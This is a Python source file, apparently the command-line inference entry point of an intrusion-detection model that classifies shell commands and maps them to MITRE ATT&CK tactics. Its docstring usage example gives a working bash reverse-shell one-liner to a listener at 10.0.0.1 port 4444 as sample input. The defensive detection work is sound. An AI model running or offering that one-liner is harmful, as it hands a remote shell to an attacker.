"""HyperIDs v2 本地推理入口。

用法：
    python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    python -m model.predict "sudo systemctl restart nginx" "df -h"

输出：verdict（互斥）+ actions（多标签）+ 规则推导的 MITRE tactic/technique。
"""
from __future__ import annotations

import sys
from pathlib import Path

import torch
from gliclass import GLiClassModel
from transformers import AutoTokenizer
import schema

ROOT = Path(__file__).resolve().parents[1]
MODEL_DIR = ROOT / "model" / "checkpoints_gpu" / "final_model_v2"

IDS = schema.all_label_ids()
OFF = schema.group_offsets()
VERDICT = IDS[OFF["verdict"][0]: OFF["verdict"][1]]
ACTIONS = IDS[OFF["action"][0]: OFF["action"][1]]
THRESHOLD = 0.5


class Predictor:
    def __init__(self, model_dir=MODEL_DIR, device=None):
        self.device = device or ("cuda" if torch.cuda.is_available() else "cpu")
        self.model = GLiClassModel.from_pretrained(str(model_dir)).to(self.device).eval()
        self.tokenizer = AutoTokenizer.from_pretrained(str(model_dir), add_prefix_space=True)

    def predict(self, command: str) -> dict:
        s = "".join(f"<<LABEL>>{l}" for l in IDS) + "<<SEP>>" + command
        enc = self.tokenizer(s, return_tensors="pt", truncation=True, max_length=320).to(self.device)
        with torch.no_grad():
            out = self.model(input_ids=enc["input_ids"], attention_mask=enc["attention_mask"],
                             max_num_classes=len(IDS))
        lg = out.logits.flatten()
        scores = {l: float(lg[j].item()) for j, l in enumerate(IDS)}
        verdict = max(VERDICT, key=lambda l: scores.get(l, -99.0))
        actions = [a for a in ACTIONS if scores.get(a, -99.0) >= THRESHOLD]
        attck = schema.derive_attck(actions)
        return {"verdict": verdict, "actions": actions, **attck}


def main():
    predictor = Predictor()
    cmds = sys.argv[1:]
    if not cmds:
        print("usage: python -m model.predict '<command>' [<command2> ...]")
        return
    for c in cmds:
        r = predictor.predict(c)
        print(f"\n{c}")
        print(f"  verdict   : {r['verdict']}")
        print(f"  actions   : {r['actions']}")
        print(f"  tactics   : {r['tactics']}")
        print(f"  techniques: {r['techniques']}")


if __name__ == "__main__":
    main()
